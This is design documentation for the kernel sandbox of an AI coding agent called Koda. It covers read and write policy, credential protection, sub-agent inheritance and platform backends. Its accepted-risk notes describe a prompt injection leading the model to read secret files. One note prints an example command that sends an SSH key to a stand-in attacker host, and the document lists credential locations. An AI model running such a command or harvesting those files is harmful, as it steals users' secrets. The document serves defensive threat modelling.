# Sandbox

Koda's kernel sandbox is **always active** — every Bash command runs
inside a sandboxed process. The sandbox enforces the perimeter; the
[trust mode](./approval.md) controls whether you see a confirmation
prompt before each mutation.

## File tool read policy

Koda's **Read, List, Grep, and Glob** tools are intentionally unrestricted —
they can access any path on the filesystem the OS permits, including paths
outside the project directory (e.g. `../other-repo`, `~/.ssh/config`).

Only **Write, Edit, and Delete** are gated to the project root.

### Why reads are unrestricted

1. **Reads cannot mutate state.** The worst-case outcome of an out-of-scope
   read is that the model sees something sensitive in its context window — which
   you, watching the terminal, can also see. No irreversible damage occurs.

2. **Bash already has the same reach.** The Bash tool runs inside the kernel
   sandbox but has read access to the full filesystem. Restricting the Read
   tool while leaving Bash unrestricted is security theater — the model just
   falls back to `cat ../secret.txt`.

3. **OS-level sandboxing is the real boundary.** On macOS (Seatbelt) and Linux
   (bwrap), the sandbox already defines what the process can access at the
   kernel level. Duplicating that check in the tool layer adds friction without
   adding protection.

4. **Cross-repo workflows are common.** Developers routinely ask koda to read
   a sibling repo, a shared library, or a dotfile — restricting this forces
   awkward workarounds.

   This follows the Claude Code approach — Claude Code's `Read` tool imposes
   no project-root scope check at all.

### Accepted risk

> ⚠️ **A carefully crafted prompt could trick the model into reading and
> summarising sensitive files** — for example `~/.aws/credentials`,
> `~/.ssh/id_rsa`, or `~/.netrc` — without explicit user consent. The
> content would appear in the chat window but not be exfiltrated unless
> the model also makes a network request (Bash + `curl`, WebFetch, etc.).
>
> **Mitigations:**
> - Those files are **write-protected** by the kernel sandbox, so the model
>   cannot modify or delete them.
> - Network exfiltration via Bash is constrained by the sandbox's outbound
>   network policy.
> - Trust-mode `safe` requires explicit approval before every Bash command,
>   which catches `curl`-style exfiltration attempts.
>
> If you work with highly sensitive secrets and want file-level read
> protection, run koda in a containerised environment with access to only
> the files you intend to expose.


### Write restrictions

Bash commands can only write to:
- The project directory
- `/tmp` and standard cache dirs (`~/.cache`, `~/.cargo`, etc.)

### Credential protection

Credential directories and files are **write-protected** — sandboxed
commands cannot modify them, but CLI tools can still *read* their own
config to authenticate. This follows the Codex model where the entire
host filesystem is read-only and credential dirs are not special-cased
beyond that.

**Write-protected directories** (reads allowed):
- `~/.ssh` — SSH private keys
- `~/.aws` — AWS credentials
- `~/.gnupg` — GPG private keys
- `~/.kube` — Kubernetes config and tokens
- `~/.azure` — Azure CLI tokens
- `~/.password-store` — pass(1) encrypted passwords
- `~/.terraform.d` — Terraform cloud tokens
- `~/.claude` — Claude Code settings and session tokens
- `~/.android` — Android SDK debug keystores and signing keys
- `~/.config/gcloud` — gcloud CLI credentials
- `~/.config/gh` — GitHub CLI PATs
- `~/.config/op` — 1Password CLI tokens
- `~/.config/helm` — Helm registry auth
- `~/.config/netlify` — Netlify CLI access tokens
- `~/.config/vercel` — Vercel CLI credentials
- `~/.config/fly` — Fly.io CLI auth tokens
- `~/.config/doppler` — Doppler secrets manager tokens
- `~/.config/stripe` — Stripe CLI API keys
- `~/.config/heroku` — Heroku CLI OAuth tokens

**Write-protected files** (reads allowed):
`~/.netrc`, `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`,
`~/.docker/config.json`, `~/.vault-token`, `~/.env`

**Fully blocked (read + write):**
- `~/.config/koda/db` — Koda's SQLite DB containing plaintext API keys

> **Security note — accepted risk:** A sandboxed command can read
> credential material and could exfiltrate it over the network (e.g.
> `curl https://evil.com -d @~/.ssh/id_rsa`). Blocking credential
> reads without blocking network egress is security theater — the
> model could also obtain tokens from environment variables, process
> output, or tool-specific commands like `gh auth token`. Network-level
> egress restriction ([#844 Gap 4](https://github.com/lijunzh/koda/issues/844))
> is the proper mitigation and is tracked separately.
>
> The only exception is `koda/db` — koda's own API keys have no
> legitimate use inside the sandbox (the koda process runs *outside*
> the sandbox), so full read+write deny is justified.

### Agent-file protection

In all modes, writes to `.koda/agents/` and `.koda/skills/` within the
project are blocked. This prevents a sandboxed command from modifying
agent definitions that could alter system prompts or tool access.

## Sub-agent inheritance

Child agents inherit the parent's trust mode and sandbox via
`TrustMode::clamp()` — a child can never run with less protection than
its caller. If the parent runs in Safe mode, the child runs in Safe mode
even if the agent JSON specifies `"mode": "auto"`.

## Platform backends

| Platform | Backend | Install |
|----------|---------|---------|
| macOS | `sandbox-exec` (seatbelt) | Built-in |
| Linux | `bwrap` (bubblewrap) | `apt install bubblewrap` |
| Windows | Not supported | — |

If the platform backend is unavailable (e.g. `bwrap` not installed on
Linux), Koda falls back to unsandboxed execution with a warning logged
via `tracing::warn!`. Install the backend for full protection.
